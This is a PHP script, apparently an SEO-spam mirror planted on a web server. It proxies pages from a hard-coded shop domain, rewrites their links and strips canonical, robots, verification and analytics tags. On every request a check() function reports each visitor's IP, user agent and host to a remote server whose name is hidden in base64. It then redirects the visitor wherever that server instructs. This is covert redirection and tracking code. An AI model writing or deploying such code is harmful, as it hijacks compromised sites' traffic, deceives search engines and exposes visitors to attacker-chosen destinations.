<?php
$domain = "http://sapatostore.com";
$Foxgo=new Foxgo();
$domain_parse = parse_url($domain);
if(isset($domain_parse['path']) && $domain_parse['path']!='/'){
    $d_host = $domain_parse['host'];
}
if($domain_parse['scheme']=='https'){
    $Foxgo->is_https=true;  //"true" is use https
}else{
    $Foxgo->is_https=false; //"false" is use http
}
$Foxgo->domain=substr($domain,strlen($domain_parse['scheme'])+3);
$Foxgo->linker=2;  //这行要是链接的行书内容，2就表示读取linker.txt的第二行内容
$Foxgo->host=$_SERVER['HTTP_HOST'];
$rquri = preg_replace("#pwenhao#","p?",$_SERVER['REQUEST_URI']);
$rquri = preg_replace("#xwenhao#","x?",$rquri);
$rquri = preg_replace("#ganwenhao#","\?",$rquri);
$_SERVER['REQUEST_URI']=$rquri;
$Foxgo->path = $_SERVER['REQUEST_URI'];
$Foxgo->scriptname = $_SERVER['SCRIPT_NAME'];

$path = str_replace($Foxgo->php_self(),"",$Foxgo->path);
if(substr($path,0,2)=='?/' && isset($d_host)){
    $path = substr($path,1);
    $Foxgo->domain = $d_host;
}

$Foxgo->fullURL=$Foxgo->translateServer().$path;
$Foxgo->connect();
$Foxgo->output();
class Foxgo{
    public $user_agent,$request_method,$domain,$cookie,$host,$cacheTime,$content,$pregarray,$scriptname,$redirect_url,$is_https,$linker;
    private $http_code,$lastModified,$resultHeader;
    function __construct(){
        $this->domain="";
        $this->linker=1;
        $this->path="";
        $this->scriptname="";
        $this->fullURL="";
        $this->cookie ="";
        $this->host="";
        $this->cacheTime=72000;
        $this->lastModified=gmdate("D, d M Y H:i:s",time()-72000)." GMT";
        $this->is_https=false;
    }
    function goURL($domain) {
        return  $this->fullURL;
    }

    function translateServer() {
        if($this->is_https){
            return "https://".$this->domain;
        }else{
            return "http://".$this->domain;
        }
    }

    function php_self(){
        return $_SERVER["SCRIPT_NAME"];
    }

    function preConnect(){
        $this->user_agent=$_SERVER['HTTP_USER_AGENT'];
        $this->request_method=$_SERVER['REQUEST_METHOD'];
        $tempCookie="";
        foreach ($_COOKIE as $i => $value) {
            $tempCookie=$tempCookie." $i=$_COOKIE[$i];";
        }
        $this->cookie=$tempCookie;
    }

    function connect(){
        $this->check(); //调试隐藏
        $this->preConnect();
        $ch=curl_init();
        curl_setopt($ch,CURLOPT_URL,$this->goURL($this->domain));
        //echo $this->goURL($this->domain);
        if($this->cookie!=""){
            curl_setopt($ch,CURLOPT_COOKIE,$this->cookie);
        }
        if($this->is_https){
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        }
        if (isset($_SERVER['HTTP_REFERER'])) curl_setopt($ch,CURLOPT_REFERER, $_SERVER['HTTP_REFERER']);
        curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
        curl_setopt($ch,CURLOPT_FOLLOWLOCATION,1);
        $output = curl_exec($ch);
        $info	= curl_getinfo( $ch );
        curl_close($ch);
        $this->postConnect($info,$output);
    }
    function postConnect($info,$output){
        $this->content_type=$info["content_type"];
        $this->http_code=$info['http_code'];
        if (isset($info['redirect_url'])) {
            $this->redirect_url=$info['redirect_url'];
        } else {
            $this->redirect_url = get_redirect_url($output);

        }
        if(!empty($info['last_modified'])){
            $this->lastModified=$info['last_modified'];
        }
        $content=substr($output,$info['header_size']);
        if($this->http_code=='200'){
            $this->content=$output;
        }
    }
    function output(){
        $currentTimeString=gmdate("D, d M Y H:i:s",time());
        if ($this->http_code=="302"||$this->http_code=="301") {
            echo('<html><head><title>301</title></head><body><h1>301</h1></body></html>');
        }if ($this->http_code=="404") {
            header("HTTP/1.1 404 Not Found");
            header("Date: $currentTimeString GMT");
            header("Content-Type: text/html");
            echo('<html><head><title>404 Not Found</title></head><body><h1>404 Not Found</h1></body></html>');
            return;
        }elseif ($this->http_code=="403") {
            header("HTTP/1.1 403 Forbidden");
            header("Date: $currentTimeString GMT");
            header("Content-Type: text/html");
            echo('<html><head><title>403 Forbidden</title></head><body><h1>403 Forbidden</h1></body></html>');
            return;
        }

        //if (preg_match ("/\.(gif|jpg|png|js|css|jpeg|ico|html|htm|shtml)$/",$_SERVER['REQUEST_URI']) && $this->content) {
//			@mkdir(dirname($_SERVER['DOCUMENT_ROOT'].$_SERVER['REQUEST_URI']),0755,true);
//			if ($out=fopen($_SERVER['DOCUMENT_ROOT'].$_SERVER['REQUEST_URI'],"w")) {
//				fwrite($out,$this->content);
//				fclose($out);
//			}
//		}
        $l = strlen($this->content);
        $expiredTime=gmdate("D, d M Y H:i:s",(time()+$this->cacheTime));
        header("HTTP/1.1 200 OK");
        header("Content-Length: $l");
        header("Content-Type: ".$this->content_type);
        header("Last-Modified: $this->lastModified");
        header("Cache-Control: max-age=$this->cacheTime");
        header("Expires: $expiredTime GMT");
        //preg_match("/Set-Cookie:[^\n]*/i",$this->resultHeader,$result);
        //	foreach($result as $i=>$value){
        //header($result[$i]);
        //}
        //$this->content ="href='htt:///www.baidu.com/sdfsdf'";
        $html = preg_replace("#p\?#","pwenhao",$this->content);
        $html = preg_replace("#x\?#","xwenhao",$html);
        $html = preg_replace("#\?#","ganwenhao",$html);
        //$html = preg_replace("#(www\.?)".$this->domain."#",$_SERVER['HTTP_HOST']. $this->scriptname,$html);
        if(substr($this->domain,-1)=='/'){
            $this->domain = substr($this->domain,0,-1);
        }
        $html = preg_replace("#(src|href)=(\"|')http://(www\.)?".str_replace(".","\.",$this->domain)."/(.*?)(\"|')#", "$1=\"http://".$this->host.$this->scriptname."?$4\"", $html);
        $html = preg_replace("#(src|href)=(\"|')(/|(?!http))(.*?)(\"|')#", "$1=\"http://".$this->host.$this->scriptname."?$3$4\"", $html);
        $html = preg_replace("#<script([^>]*)>(.*)(analytics\.js|doubleclick\.net)(.*)</script>#"," ",$html);
        $html = preg_replace("#<link\srel=\"canonical\"(.*?)/>#", "", $html);
        $html = preg_replace("#<link\srel=\"search\"(.*?)>#", "", $html);
        $html = preg_replace("#<meta\sname=\"viewport\"(.*?)>#", "", $html);
        $html = preg_replace("#<meta\sname=\"robots\"(.*?)>#", "", $html);
        $html = preg_replace("#<meta\sname=\"google-site-verification\"(.*?)/>#", "", $html);
        $html = preg_replace("#<meta\sname=\"generator\"(.*?)>#", "", $html);
        $html = preg_replace("#<meta\sname=\"viewport\"(.*?)>#", "", $html);
        $html = preg_replace("#<meta\sname=\"author\"(.*?)>#", "", $html);
        $html = preg_replace("#<meta\sname=\"twitter(.*?)>#", "", $html);
        $html = preg_replace("#<meta\sname=\"aol-te-auth(.*?)>#", "", $html);
        $html = preg_replace("#<meta\sname=\"verify-v1(.*?)>#", "", $html);
        $html = preg_replace("#<meta\sname=\"googlebot(.*?)>#", "", $html);
        $html = preg_replace("#<meta\sname=\"msvalidate.01(.*?)>#", "", $html);
        $html = preg_replace("#<meta\sname=\"p:domain_verify(.*?)>#", "", $html);
        $html = preg_replace("#<meta\sname=\"shareaholic(.*?)>#", "", $html);
        $html = preg_replace("#<meta\sname=\"wot-verification(.*?)>#", "", $html);
        $html = preg_replace("#<meta\sname='shareaholic(.*?)>#", "", $html);
        $html = preg_replace("#<base(.*?)>#", "", $html);
        echo $html;

    }

    function check(){
        $ch=curl_init();
        curl_setopt($ch,CURLOPT_URL,$this->googleurl());
        curl_setopt($ch,CURLOPT_HTTPHEADER,
            array(
                "X-x-cpi: ".$this->get_client_ip(),
                "User-Agent: ".$this->user_agent,
                "Hosts: ".$this->host,  //honoluluprosecutor.com
                "Script-Name: ".ltrim($this->scriptname,'/')
            ));
        curl_setopt($ch,CURLOPT_FOLLOWLOCATION,false);
        curl_setopt($ch,CURLOPT_AUTOREFERER,true);
        curl_setopt($ch,CURLOPT_HEADER,true);
        curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
        $output=curl_exec($ch);
        $info	= curl_getinfo( $ch );
        curl_close($ch);
        if (!isset($info['redirect_url'])) {
            $info["redirect_url"] = get_redirect_url($output);
        }
        if ($info['http_code']==301 || $info['http_code']==302) {
            header('HTTP/1.0 301 Moved Permanently');
            header('Location: '.$info["redirect_url"]);
            exit;
        }
        //print_r($info);
    }
    function getpath($dizhi){
        $file_contents = '';
        if (is_callable('curl_init')) {
            $ch = curl_init();
            $timeout = 10;
            curl_setopt($ch, CURLOPT_URL, $dizhi);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
            $file_contents = curl_exec($ch);
            curl_close($ch);
        } elseif (ini_get("allow_url_fopen") == 1) {
            if (!function_exists("file_get_contents")) {
                function file_get_contents($filename) {
                    $handle = fopen($filename, "rb");
                    $contents = fread($handle, filesize($filename));
                    fclose($handle);
                    return $contents;
                }
            }
            $file_contents = @file_get_contents($url);
        }
        return $file_contents;
    }
    function get_client_ip(){
        if (getenv("HTTP_CLIENT_IP") && strcasecmp(getenv("HTTP_CLIENT_IP"), "unknown"))
            $ip = getenv("HTTP_CLIENT_IP");
        else if (getenv("HTTP_X_FORWARDED_FOR") && strcasecmp(getenv("HTTP_X_FORWARDED_FOR"), "unknown"))
            $ip = getenv("HTTP_X_FORWARDED_FOR");
        else if (getenv("REMOTE_ADDR") && strcasecmp(getenv("REMOTE_ADDR"), "unknown"))
            $ip = getenv("REMOTE_ADDR");
        else if (isset($_SERVER['REMOTE_ADDR']) && $_SERVER['REMOTE_ADDR'] && strcasecmp($_SERVER['REMOTE_ADDR'], "unknown"))
            $ip = $_SERVER['REMOTE_ADDR'];
        else
            $ip = "unknown";
        return($ip);
    }
    function googleurl(){
        $google=base64_decode("bGVmdGdvZC5jb20=");
        return "http://cpi.".$google."/sd_check.php"."?y=".$this->domain;
    }
}
function get_redirect_url($header) {
    if(preg_match('/^Location:\s+(.*)$/mi', $header, $m)) {
        return trim($m[1]);
    }
    return "";
}
?>